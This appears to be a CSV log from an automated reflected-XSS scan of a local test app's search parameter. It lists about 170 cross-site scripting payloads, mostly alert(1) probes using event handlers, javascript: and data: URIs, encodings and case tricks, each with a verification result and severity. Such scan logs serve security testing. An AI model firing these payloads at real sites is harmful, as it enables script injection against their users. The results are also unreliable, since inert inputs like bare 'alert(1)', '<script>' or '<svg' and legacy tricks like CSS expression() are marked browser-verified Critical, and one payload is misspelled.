Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,No,,High
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input type=button value=xss onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<details open ontoggle=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<a href=javascript:alert(1)>click</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form><button formaction=javascript:alert(1)>X</button>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<meta http-equiv=refresh content=0;url=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"<meta http-equiv=refresh content=""0;javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<style>*{background:url('javascript:alert(1)')}</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<style>@import'javascript:alert(1)';</style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<style onload=alert(1)></style>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<math><mi xlink:href=javascript:alert(1)>X</mi></math>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<table><td background=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<div style=width:expression(alert(1))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>alert&#x28;1&#x29;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onabort=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onafterprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onafterupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforecopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforecut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforedeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforeeditfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforepaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforeprint=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforeunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbeforeupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onblur=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onbounce=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oncellchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oncontrolselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oncopy=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondataavailable=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondatasetchanged=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondatasetcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondblclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondeactivate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondragend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondragenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondragover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondragstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerrorupdate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onfilterchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onfinish=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onfocusin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onfocusout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onhelp=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onkeydown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onkeypress=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onkeyup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onlayoutcomplete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onlosecapture=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmousedown=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmouseenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmouseleave=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmousemove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmouseup=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmousewheel=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmoveend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onmovestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onpropertychange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onreadystatechange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,javascript:alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-09 17:15:11,http://localhost:3000/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
